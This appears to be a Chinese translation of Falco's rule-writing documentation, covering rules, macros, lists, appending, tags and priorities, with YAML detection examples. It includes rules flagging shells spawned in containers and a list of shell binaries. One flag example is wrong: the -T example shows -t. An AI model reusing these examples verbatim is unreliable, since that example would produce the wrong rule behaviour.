class="line"></span><br></pre></td></tr></table></figure>

<p>参考：</p>
<p><a href="https://falco.org/docs/">https://falco.org/docs/</a></p>
<h2 id="规则介绍"><a href="#规则介绍" class="headerlink" title="规则介绍"></a>规则介绍</h2><p>Falco规则文件是由三种基本元素的yaml文件</p>
<table>
<thead>
<tr>
<th>元素</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Rules</td>
<td>生成告警的条件，一条规则的告警输出伴随着一段描述文字</td>
</tr>
<tr>
<td>Macros</td>
<td>在其他规则甚至是其他宏中使用的条件规则片段，宏提供了一种可以命名通用样式以及扫除冗余规则的方法</td>
</tr>
<tr>
<td>Lists</td>
<td>列表可以包含规则、宏、其他列表。列表不能像规则或者宏一样作为过滤表达式</td>
</tr>
</tbody></table>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>随着时间发展，规则文件不再向后兼容。同样的，Sysdig新的库纳入可能引入规则过滤的新的字段、操作符等。我们给定的一组规则取决于Sysdig库的字段和操作符</p>
<p>从0.14.0开始，Falco的引擎版本和规则版本都支持显式的版本定义</p>
<p><strong>Falco 引擎版本：</strong></p>
<p>现在Falco可执行文件和Falco引擎C++对象支持返回版本号，这个初始版本是2，当我们更改规则文件格式或者增加新的操作符的时候就会增加版本号</p>
<p><strong>Falco规则格式版本号：</strong></p>
<p>规则文件包含一个Falco版本的顶级对象：<code>required_engine_version: N</code>。这个定义的意义是该规则文件适配的最低Falco引擎的版本号。如果不包含这项定义，则不进行版本检查。</p>
<p>如果规则文件的engine_version的版本远高于引擎版本，会加载配置文件并返回错误。</p>
<h2 id="规则的键"><a href="#规则的键" class="headerlink" title="规则的键"></a>规则的键</h2><p>Falco规则包含如下键。</p>
<table>
<thead>
<tr>
<th>Key</th>
<th>Required</th>
<th>Description</th>
<th>Default</th>
</tr>
</thead>
<tbody><tr>
<td><code>rule</code></td>
<td>yes</td>
<td>给规则一个简单统一的名称</td>
<td></td>
</tr>
<tr>
<td><code>condition</code></td>
<td>yes</td>
<td>对事件进行匹配的过滤表达式</td>
<td></td>
</tr>
<tr>
<td><code>desc</code></td>
<td>yes</td>
<td>关于规则的更详细描述</td>
<td></td>
</tr>
<tr>
<td><code>output</code></td>
<td>yes</td>
<td>输出的具体说明，遵循Sysdig的输出格式（ <a href="http://www.sysdig.com/wiki/sysdig-user-guide/#output-formatting">output format syntax</a>）</td>
<td></td>
</tr>
<tr>
<td><code>priority</code></td>
<td>yes</td>
<td>事件的严重程度（大小写不敏感）: <code>emergency</code>, <code>alert</code>, <code>critical</code>,<br/> <code>error</code>, <code>warning</code>, <code>notice</code>, <code>informational</code>, <code>debug</code>.</td>
<td></td>
</tr>
<tr>
<td><code>exceptions</code></td>
<td>no</td>
<td>不告警的一组异常</td>
<td></td>
</tr>
<tr>
<td><code>enabled</code></td>
<td>no</td>
<td>如果设置为false,不会加载该规则也不匹配任何规则</td>
<td><code>true</code></td>
</tr>
<tr>
<td><code>tags</code></td>
<td>no</td>
<td>一组应用于规则的标签 (more on this <a href="https://falco.org/docs/rules/#rule-condition-best-practices">below</a>).</td>
<td></td>
</tr>
<tr>
<td><code>warn_evttypes</code></td>
<td>no</td>
<td>如果设置为false，将抑制没有事件类型的规则的告警</td>
<td><code>true</code></td>
</tr>
<tr>
<td><code>skip-if-unknown-filter</code></td>
<td>no</td>
<td>如果设置为true，如果一个规则文件包含Falco未知规则的规则，<br/>Falco会静默接受但是不执行。如果设置为false,Falco会输出错误</td>
<td><code>false</code></td>
</tr>
</tbody></table>
<h2 id="条件-Conditions："><a href="#条件-Conditions：" class="headerlink" title="条件 Conditions："></a>条件 Conditions：</h2><p>Conditions是规则的关键部分，一个condition是一个Sysdig事件的Boolean断言，任何Sysdig过滤器适用于Falco condition(初开一些明确的排除项)。另外，Falco condition可以包含宏（这个能力是Sysdig不具备的）</p>
<p>如下是一个每当在容器中执行一个bash shell的的condition</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">container.<span class="built_in">id</span> != host <span class="keyword">and</span> proc.<span class="built_in">name</span> = bash</span><br></pre></td></tr></table></figure>

<p><code>container.id != host</code>判断是否在一个容器中（如果事件发生在一个普通主机上，Sysdig事件的”container“字段将会等于”host”）</p>
<p><code>proc.name = bash</code>检查进程名字是不是bash。请注意这个condition甚至不包含系统调用的子句。只检查远数据。由此。如果在容器中使用了bash shell，Falco会输出所有使用bash的系统调用。</p>
<p><strong>使用上诉condition完整规则如下：</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">shell_in_container</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">notice</span> <span class="string">shell</span> <span class="string">activity</span> <span class="string">within</span> <span class="string">a</span> <span class="string">container</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">container.id</span> <span class="type">!=</span> <span class="string">host</span> <span class="string">and</span> <span class="string">proc.name</span> <span class="string">=</span> <span class="string">bash</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">shell</span> <span class="string">in</span> <span class="string">a</span> <span class="string">container</span> <span class="string">(user=%user.name</span> <span class="string">container_id=%container.id</span> <span class="string">container_name=%container.name</span> <span class="string">shell=%proc.name</span> <span class="string">parent=%proc.pname</span> <span class="string">cmdline=%proc.cmdline)</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="string">WARNING</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>





<h2 id="宏-Macros"><a href="#宏-Macros" class="headerlink" title="宏 Macros"></a>宏 Macros</h2><p>如上所诉，宏提供了一种方法来定义规则的重复部分。非常简单的例子，如果我们有很多在容器中的规则，我们可以定义一个在容器中的宏。</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">- <span class="function"><span class="keyword">macro</span>: <span class="title">in_container</span></span></span><br><span class="line">  <span class="symbol">condition:</span> container.id != host</span><br></pre></td></tr></table></figure>

<p>使用这种宏定义，我们之前的规则就可以改为<code>in_container and proc.name = bash</code></p>
<p>更多关于宏的规则可以见： <a href="https://falco.org/docs/rules/default-macros">default macros</a> or the <code>rules/falco_rules.yaml</code></p>
<h2 id="列表-Lists"><a href="#列表-Lists" class="headerlink" title="列表 Lists"></a>列表 Lists</h2><p>列表可以包含规则、宏、其他列表。列表不能像规则或者宏一样作为过滤表达式</p>
<table>
<thead>
<tr>
<th>Key</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>list</code></td>
<td>list的名称</td>
</tr>
<tr>
<td><code>items</code></td>
<td>list的值</td>
</tr>
</tbody></table>
<p>如下例子：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">list:</span> <span class="string">shell_binaries</span></span><br><span class="line">  <span class="attr">items:</span> [<span class="string">bash</span>, <span class="string">csh</span>, <span class="string">ksh</span>, <span class="string">sh</span>, <span class="string">tcsh</span>, <span class="string">zsh</span>, <span class="string">dash</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">list:</span> <span class="string">userexec_binaries</span></span><br><span class="line">  <span class="attr">items:</span> [<span class="string">sudo</span>, <span class="string">su</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">list:</span> <span class="string">known_binaries</span></span><br><span class="line">  <span class="attr">items:</span> [<span class="string">shell_binaries</span>, <span class="string">userexec_binaries</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">macro:</span> <span class="string">safe_procs</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">proc.name</span> <span class="string">in</span> <span class="string">(known_binaries)</span></span><br></pre></td></tr></table></figure>





<h2 id="添加列表、规则、宏"><a href="#添加列表、规则、宏" class="headerlink" title="添加列表、规则、宏"></a>添加列表、规则、宏</h2><p>如果你使用多个Falco文件，你可能想添加新的规则到已经存在的列表、规则、宏。</p>
<p><strong>对于list:</strong></p>
<p>新的文件需要添加一个同名的规则并添加<code>append: true</code>字段，当加载lists时候，会将新文件的值加入到原list的末尾。</p>
<p><strong>对于rules/macros:</strong></p>
<p>另外的文件里的规则会作为新的condition添加。</p>
<p>注意当添加lists, rules or macros时候的顺序问题，例如，添加一个已经存在的默认规则(e.g. <code>Terminal shell in container</code>)</p>
<p>必须确定自己配置的文件(e.g. <code>/etc/falco/rules.d/custom-rules.yaml</code>) 在默认文件(<code>/etc/falco/falco_rules.yaml</code>)之后加载。可以通过多个-r参数的正确顺序来确保规则文件的顺序。</p>
<p><strong>示例：</strong></p>
<p>下面所有的例子，都假定<code>falco -r /etc/falco/falco_rules.yaml -r /etc/falco/falco_rules.local.yaml</code>,或者有默认的rules_file入口falco.yaml，有默认的<code>/etc/falco/falco.yaml</code>作为第一个， <code>/etc/falco/falco_rules.local.yaml</code> 作为第二个。</p>
<ul>
<li><p><u>添加list:</u></p>
<ul>
<li><p>/etc/falco/falco_rules.yaml：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">- lis<span class="variable">t:</span> my_programs</span><br><span class="line">  item<span class="variable">s:</span> [<span class="keyword">ls</span>, <span class="keyword">cat</span>, <span class="keyword">pwd</span>]</span><br><span class="line"></span><br><span class="line">- rule: my_programs_opened_file</span><br><span class="line">  desc: track whenever <span class="keyword">a</span> <span class="keyword">set</span> of programs opens <span class="keyword">a</span> <span class="keyword">file</span></span><br><span class="line">  condition: proc.name in (my_programs) <span class="built_in">and</span> evt.<span class="built_in">type</span>=<span class="keyword">open</span></span><br><span class="line">  outpu<span class="variable">t:</span> <span class="keyword">a</span> tracked program opened <span class="keyword">a</span> <span class="keyword">file</span> (user=%user.name <span class="keyword">command</span>=%proc.cmdline <span class="keyword">file</span>=%fd.name)</span><br><span class="line">  priority: INFO</span><br></pre></td></tr></table></figure></li>
<li><p>/etc/falco/falco_rules.local.yaml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">list:</span> <span class="string">my_programs</span></span><br><span class="line">  <span class="attr">append:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">items:</span> [<span class="string">cp</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
<p>上诉规则中。<code>ls</code>, <code>cat</code>, <code>pwd</code>, 或者 <code>cp</code> 打开一个文件都会触发</p>
</li>
</ul>
<ul>
<li><p><u>添加Macros:</u></p>
<ul>
<li><p>/etc/falco/falco_rules.yaml：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">macro:</span> <span class="string">access_file</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">evt.type=open</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">program_accesses_file</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">track</span> <span class="string">whenever</span> <span class="string">a</span> <span class="string">set</span> <span class="string">of</span> <span class="string">programs</span> <span class="string">opens</span> <span class="string">a</span> <span class="string">file</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">proc.name</span> <span class="string">in</span> <span class="string">(cat,</span> <span class="string">ls)</span> <span class="string">and</span> <span class="string">(access_file)</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">a</span> <span class="string">tracked</span> <span class="string">program</span> <span class="string">opened</span> <span class="string">a</span> <span class="string">file</span> <span class="string">(user=%user.name</span> <span class="string">command=%proc.cmdline</span> <span class="string">file=%fd.name)</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="string">INFO</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>/etc/falco/falco_rules.local.yaml:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">macro:</span> <span class="string">access_file</span></span><br><span class="line">  <span class="attr">append:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">or</span> <span class="string">evt.type=openat</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p> ls/cat 并且open/opnat都会触发</p>
</li>
</ul>
<ul>
<li><p><u>添加rules:</u></p>
<ul>
<li><p>/etc/falco/falco_rules.yaml：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">program_accesses_file</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">track</span> <span class="string">whenever</span> <span class="string">a</span> <span class="string">set</span> <span class="string">of</span> <span class="string">programs</span> <span class="string">opens</span> <span class="string">a</span> <span class="string">file</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">proc.name</span> <span class="string">in</span> <span class="string">(cat,</span> <span class="string">ls)</span> <span class="string">and</span> <span class="string">evt.type=open</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">a</span> <span class="string">tracked</span> <span class="string">program</span> <span class="string">opened</span> <span class="string">a</span> <span class="string">file</span> <span class="string">(user=%user.name</span> <span class="string">command=%proc.cmdline</span> <span class="string">file=%fd.name)</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="string">INFO</span></span><br></pre></td></tr></table></figure></li>
<li><p>/etc/falco/falco_rules.local.yaml:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">program_accesses_file</span></span><br><span class="line">  <span class="attr">append:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">and</span> <span class="string">not</span> <span class="string">user.name=root</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><code>ls</code>/<code>cat</code> either used <code>open</code> on a file, but not if the user was root</p>
</li>
</ul>
<p><strong>rule/macro添加规则并进行逻辑操作：</strong></p>
<p>记住当添加rule/macro的时候， rule/macro需要以简单的方式添加。不然容器产生歧义。比如如下例子：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">my_rule</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">...</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">evt.type=open</span> <span class="string">and</span> <span class="string">proc.name=apache</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">...</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">my_rule</span></span><br><span class="line">  <span class="attr">append:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">or</span> <span class="string">proc.name=nginx</span></span><br></pre></td></tr></table></figure>

<p>上面的意思是允许apache打开文件或者允许nginx做任何事？</p>
<p>如上需要通过圆括号确定逻辑运算的范围。或者尽可能避免添加 condition。</p>
<h2 id="不使用默认规则"><a href="#不使用默认规则" class="headerlink" title="不使用默认规则"></a>不使用默认规则</h2><p>尽管Falco提供很强大的默认规则，有时候在自己的场景中需要禁用默认规则。Falco提供多种方式</p>
<ul>
<li><p><strong>通过已有的宏：</strong></p>
<p>大多数默认规则都提供<code>consider_*</code>宏作为规则condition的一部分。这些 <code>consider_*</code> 通常设置为 <code>(never_true)</code> or <code>(always_true)</code> 来决定是否使用规则。现在如果你想使用一个默认关闭的规则(e.g. <code>Unexpected outbound connection destination</code>),你只需要在自己的配置文件中重写 <code>consider_*</code> 宏就可以了(<code>consider_all_outbound_conns</code> in this case) </p>
<p>比如:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">macro:</span> <span class="string">consider_all_outbound_conns</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">(always_true)</span></span><br></pre></td></tr></table></figure>



<p><u>请记住：规则文件的顺序问题，后面定义的相同名字的宏为准。</u></p>
</li>
</ul>
<ul>
<li><p><strong>通过Falco参数：</strong></p>
<p>Falco提供如下参数限制哪些默认规则执行</p>
<figure class="highlight pony"><table><tr><td class="code"><pre><span class="line">-<span class="type">D</span> &lt;substring&gt;                <span class="type">Disable</span> any rules <span class="keyword">with</span> names having the substring &lt;substring&gt;. <span class="type">Can</span> <span class="keyword">be</span> specified multiple times.</span><br><span class="line"></span><br><span class="line">-<span class="type">T</span> &lt;<span class="meta">tag</span>&gt;                      <span class="type">Disable</span> any rules <span class="keyword">with</span> a <span class="meta">tag</span>=&lt;<span class="meta">tag</span>&gt;. <span class="type">Can</span> <span class="keyword">be</span> specified multiple times.</span><br><span class="line">                               <span class="type">Can</span> <span class="keyword">not</span> <span class="keyword">be</span> specified <span class="keyword">with</span> -t.</span><br><span class="line"></span><br><span class="line">-t &lt;<span class="meta">tag</span>&gt;                      <span class="type">Only</span> run those rules <span class="keyword">with</span> a <span class="meta">tag</span>=&lt;<span class="meta">tag</span>&gt;. <span class="type">Can</span> <span class="keyword">be</span> specified multiple times.</span><br><span class="line">                               <span class="type">Can</span> <span class="keyword">not</span> <span class="keyword">be</span> specified <span class="keyword">with</span> -<span class="type">T</span>/-<span class="type">D</span>.</span><br><span class="line">                               </span><br></pre></td></tr></table></figure>

<p>These parameters can also be specified as Helm chart value (<code>extraArgs</code>) if you are deploying Falco via the official Helm chart.</p>
</li>
</ul>
<ul>
<li><p><strong>通过自定义规则文件：</strong></p>
<p>最后但同样重要的，通过添加 append: true和enabled: false。适用于没有 <code>consider_*</code> 宏的情况。</p>
<p>确保自定义规则文件在默认文件之后加载。</p>
<p>例如不是用 <code>/etc/falco/falco_rules.yaml</code> 文件的 <code>User mgmt binaries</code> ，可以在自定义规则文件中写：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">User</span> <span class="string">mgmt</span> <span class="string">binaries</span></span><br><span class="line">  <span class="attr">append:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>可能有bug，如果上诉配置不能成功，使用下面的：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">User</span> <span class="string">mgmt</span> <span class="string">binaries</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">and</span> <span class="string">(never_true)</span></span><br><span class="line">  <span class="attr">append:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="规则优先级"><a href="#规则优先级" class="headerlink" title="规则优先级"></a>规则优先级</h2><p>每一个Falco 规则都有一个优先级，用来表示严重程度，如下等级：</p>
<ul>
<li><code>EMERGENCY</code></li>
<li><code>ALERT</code></li>
<li><code>CRITICAL</code></li>
<li><code>ERROR</code></li>
<li><code>WARNING</code></li>
<li><code>NOTICE</code></li>
<li><code>INFORMATIONAL</code></li>
<li><code>DEBUG</code></li>
</ul>
<p>等级划分的指导规则如下：</p>
<ul>
<li>如果与写文件有关，就是<code>ERROR</code></li>
<li>如果是读取未授权读取事<code>WARNING</code></li>
<li>如果是异常的行为(生成未知的shell,一个不正常的网络连接）<code>NOTICE</code></li>
<li>如果是违反好的生产实践习惯（比如特权容器、敏感挂载目录、用root允许交互式命令）<code>INFO</code></li>
</ul>
<p>一个例外的规则就是”Run shell untrusted”，<code>DEBUG</code>.</p>
<h2 id="规则标签-tag"><a href="#规则标签-tag" class="headerlink" title="规则标签 tag"></a>规则标签 tag</h2><p>0.6.0版本开始，规则有一个设置tag的选项，tag用来将关联的规则进行分类</p>
<p>例如：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">File</span> <span class="string">Open</span> <span class="string">by</span> <span class="string">Privileged</span> <span class="string">Container</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">Any</span> <span class="string">open</span> <span class="string">by</span> <span class="string">a</span> <span class="string">privileged</span> <span class="string">container.</span> <span class="string">Exceptions</span> <span class="string">are</span> <span class="string">made</span> <span class="string">for</span> <span class="string">known</span> <span class="string">trusted</span> <span class="string">images.</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">(open_read</span> <span class="string">or</span> <span class="string">open_write)</span> <span class="string">and</span> <span class="string">container</span> <span class="string">and</span> <span class="string">container.privileged=true</span> <span class="string">and</span> <span class="string">not</span> <span class="string">trusted_containers</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">File</span> <span class="string">opened</span> <span class="string">for</span> <span class="string">read/write</span> <span class="string">by</span> <span class="string">privileged</span> <span class="string">container</span> <span class="string">(user=%user.name</span> <span class="string">command=%proc.cmdline</span> <span class="string">%container.info</span> <span class="string">file=%fd.name)</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="string">WARNING</span></span><br><span class="line">  <span class="attr">tags:</span> [<span class="string">container</span>, <span class="string">cis</span>]</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>这个示例中，”File Open by Privileged Container” 这个规则使用了一个tags “container” and “cis”。如果tags在规则中不存在或者为空，则表示没有tags 。</p>
<p>如下是如何使用tags：</p>
<ul>
<li><p>使用-T <tag> 参数来禁用含有此tag的的规则，-T可以多次使用。例如，你可以跳过”filesystem”和 “cis” 标签的规则，你可以通过如下参数启动Falco。<code>falco -t filesystem -t cis ...</code> 。-T不能拼写为-t。</p>
</li>
<li><p>可以使用-t <tag>参数只使用含有此tag的规则，-t可以多次使用。例如，例如只使用含有”filesystem”和 “cis”标签，你可以使用如下参数启动falco<code>falco -t filesystem -t cis ....</code>-t不能指定为-T 或者 <code>-D &lt;pattern&gt;</code> (disable rules by rule name regex)</p>
</li>
</ul>
<p><strong>当前可用的规则标签</strong></p>
<table>
<thead>
<tr>
<th>Tag</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>filesystem</code></td>
<td>与读写文件相关</td>
</tr>
<tr>
<td><code>software_mgmt</code></td>
<td>与软件/包 管理工具相关例如rpm,dpkg,etc.</td>
</tr>
<tr>
<td><code>process</code></td>
<td>与创建新的进程或者改变当前进程的状态相关</td>
</tr>
<tr>
<td><code>database</code></td>
<td>数据库相关</td>
</tr>
<tr>
<td><code>host</code></td>
<td>仅适用于容器外</td>
</tr>
<tr>
<td><code>shell</code></td>
<td>与运行shell相关</td>
</tr>
<tr>
<td><code>container</code></td>
<td>仅适用于容器</td>
</tr>
<tr>
<td><code>cis</code></td>
<td>与cis docker基准相关</td>
</tr>
<tr>
<td><code>users</code></td>
<td>用户管理，改变进程身份相关</td>
</tr>
<tr>
<td><code>network</code></td>
<td>与网络活动相关</td>
</tr>
</tbody></table>
<p>规则可以使用多个标签，已有的规则至少有一个标签。</p>
<h2 id="规则条件最佳实践"><a href="#规则条件最佳实践" class="headerlink" title="规则条件最佳实践"></a>规则条件最佳实践</h2><p>允许按事件类型对规则进行分组，这提高了性能，Falco更喜欢制定至少一个<code>evt.type=</code>运算的规则条件。在条件开始，任何negative运算(i.e. <code>not</code> or <code>!=</code>)之前。如果一个条件没有任何 <code>evt.type=</code> 运算，Falco日志警告类似如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Rule</span> no_evttype: <span class="built_in">warning</span> (<span class="keyword">no</span>-evttype):</span><br><span class="line">proc.name=foo</span><br><span class="line">     did <span class="keyword">not</span> contain <span class="keyword">any</span> evt.<span class="keyword">type</span> restriction, meaning that it will run <span class="keyword">for</span> <span class="keyword">all</span> event <span class="keyword">types</span>.</span><br><span class="line">     This has a significant performance penalty. Consider adding an evt.<span class="keyword">type</span> restriction <span class="keyword">if</span> possible.</span><br></pre></td></tr></table></figure>

<p>如果在规则条件的后半部分有 <code>evt.type</code> 运算，Falco日志警告类似如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Rule</span> evttype_not_equals: <span class="built_in">warning</span> (<span class="keyword">trailing</span>-evttype):</span><br><span class="line">evt.<span class="keyword">type</span>!=execve</span><br><span class="line">     does <span class="keyword">not</span> have <span class="keyword">all</span> evt.<span class="keyword">type</span> restrictions at the beginning <span class="keyword">of</span> the condition,</span><br><span class="line">     <span class="keyword">or</span> uses a negative match (i.e. &quot;not&quot;/&quot;!=&quot;) <span class="keyword">for</span> <span class="keyword">some</span> evt.<span class="keyword">type</span> restriction.</span><br><span class="line">     This has a performance penalty, <span class="keyword">as</span> the <span class="keyword">rule</span> can <span class="keyword">not</span> be limited <span class="keyword">to</span> specific event <span class="keyword">types</span>.</span><br><span class="line">     Consider moving <span class="keyword">all</span> evt.<span class="keyword">type</span> restrictions <span class="keyword">to</span> the beginning <span class="keyword">of</span> the <span class="keyword">rule</span> <span class="keyword">and</span>/<span class="keyword">or</span></span><br><span class="line">     replacing negative matches <span class="keyword">with</span> positive matches <span class="keyword">if</span> possible.</span><br></pre></td></tr></table></figure>





<h2 id="转义特殊字符"><a href="#转义特殊字符" class="headerlink" title="转义特殊字符"></a>转义特殊字符</h2><p>在一些情况下，规则可能包含有特殊的字符比如<code>(</code>,spaces, etc.例如，你可能需要寻找一个proc.name的(systemd)包括圆括号。</p>
<p>Falco,就像Sysdig,允许使用<code>&quot;</code>来转义特殊字符例如：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">Any</span> <span class="string">Open</span> <span class="string">Activity</span> <span class="string">by</span> <span class="string">Systemd</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">Detects</span> <span class="string">all</span> <span class="string">open</span> <span class="string">events</span> <span class="string">by</span> <span class="string">systemd.</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">evt.type=open</span> <span class="string">and</span> <span class="string">proc.name=&quot;(systemd)&quot;</span> <span class="string">or</span> <span class="string">proc.name=systemd</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">&quot;File opened by systemd (user=%user.name command=%proc.cmdline file=%fd.name)&quot;</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="string">WARNING</span></span><br></pre></td></tr></table></figure>

<p>当含有lists时，通过在引号外面添加单引号来确保引号不会被yaml解析，</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">list:</span> <span class="string">systemd_procs</span></span><br><span class="line">  <span class="attr">items:</span> [<span class="string">systemd</span>, <span class="string">&#x27;&quot;(systemd)&quot;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">Any</span> <span class="string">Open</span> <span class="string">Activity</span> <span class="string">by</span> <span class="string">Systemd</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">Detects</span> <span class="string">all</span> <span class="string">open</span> <span class="string">events</span> <span class="string">by</span> <span class="string">systemd.</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">evt.type=open</span> <span class="string">and</span> <span class="string">proc.name</span> <span class="string">in</span> <span class="string">(systemd_procs)</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">&quot;File opened by systemd (user=%user.name command=%proc.cmdline file=%fd.name)&quot;</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="string">WARNING</span></span><br></pre></td></tr></table></figure>





<h2 id="忽略系统调用"><a href="#忽略系统调用" class="headerlink" title="忽略系统调用"></a>忽略系统调用</h2><p>出于性能原因，当前在Falco处理某些进程之前就会被丢弃，如下是这些的列表。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">access <span class="keyword">alarm</span> brk capget clock_getres clock_gettime clock_nanosleep clock_settime <span class="keyword">close</span> container cpu_hotplug drop epoll_create epoll_create1 epoll_ctl epoll_pwait epoll_wait eventfd eventfd2 exit_group <span class="keyword">fcntl</span> fcntl64 fdatasync fgetxattr flistxattr fstat fstat64 fstatat64 fstatfs fstatfs64 fsync futex get_robust_list get_thread_area getcpu getcwd getdents getdents64 getegid geteuid getgid getgroups getitimer <span class="keyword">getpeername</span> getpgid <span class="keyword">getpgrp</span> getpid getppid <span class="keyword">getpriority</span> getresgid getresuid getrlimit getrusage getsid <span class="keyword">getsockname</span> <span class="keyword">getsockopt</span> gettid gettimeofday getuid getxattr infra io_cancel io_destroy io_getevents io_setup io_submit ioprio_get ioprio_set k8s lgetxattr listxattr llistxattr llseek lseek <span class="keyword">lstat</span> lstat64 madvise mesos mincore mlock mlockall mmap mmap2 mprotect mq_getsetattr mq_notify mq_timedreceive mq_timedsend mremap <span class="keyword">msgget</span> <span class="keyword">msgrcv</span> <span class="keyword">msgsnd</span> munlock munlockall munmap nanosleep newfstatat newselect notification olduname page_fault pause poll ppoll pread pread64 preadv procinfo pselect6 pwrite pwrite64 pwritev <span class="keyword">read</span> readv <span class="keyword">recv</span> recvmmsg remap_file_pages rt_sigaction rt_sigpending rt_sigprocmask rt_sigsuspend rt_sigtimedwait sched_get_priority_max sched_get_priority_min sched_getaffinity sched_getparam sched_getscheduler sched_yield <span class="keyword">select</span> <span class="keyword">semctl</span> <span class="keyword">semget</span> <span class="keyword">semop</span> <span class="keyword">send</span> sendfile sendfile64 sendmmsg setitimer setresgid setrlimit settimeofday sgetmask <span class="keyword">shutdown</span> signaldeliver signalfd signalfd4 sigpending sigprocmask sigreturn <span class="keyword">splice</span> <span class="keyword">stat</span> stat64 statfs statfs64 switch sysdigevent tee <span class="keyword">time</span> timer_create timer_delete timer_getoverrun timer_gettime timer_settime timerfd_create timerfd_gettime timerfd_settime <span class="keyword">times</span> ugetrlimit <span class="keyword">umask</span> uname ustat vmsplice wait4 waitid <span class="keyword">waitpid</span> <span class="keyword">write</span> writev</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当启动的时候使用 -i 参数，Falco会打印忽略和存在的事件或系统调用。如果你想Falco处理所有事件，包括上述列表，则可以使用-A参数。</p>
